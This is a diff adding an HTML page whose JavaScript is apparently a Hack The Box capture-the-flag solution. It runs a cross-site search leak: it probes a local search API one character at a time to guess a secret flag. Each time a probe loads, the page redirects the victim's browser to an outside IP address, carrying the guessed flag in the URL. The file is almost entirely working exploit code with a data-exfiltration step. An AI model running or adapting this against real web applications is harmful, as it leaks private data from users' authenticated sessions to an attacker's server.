@@ -1,0 +1,25 @@
+<html>
+<body>
+    <script>
+        var url = "http://127.0.0.1:1337";
+        var searchQuery = "/api/entries/search?q=";
+        var flag = "HTB{";
+
+        var letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_+!@{}";
+
+        async function attack() {
+            for(i = 0; i < letters.length; i++) {
+                const script = document.createElement('script');
+                const s = letters[i];
+                script.setAttribute('src', url + searchQuery + flag + s);
+                const path = 'window.location="http://66.23.234.74/?flag=' + flag + s + '"';
+                script.setAttribute('onload', path);              
+                document.querySelector('head').appendChild(script);
+            }                
+        }
+        attack();       
+    </script>
+</body>
+</html>
+
+
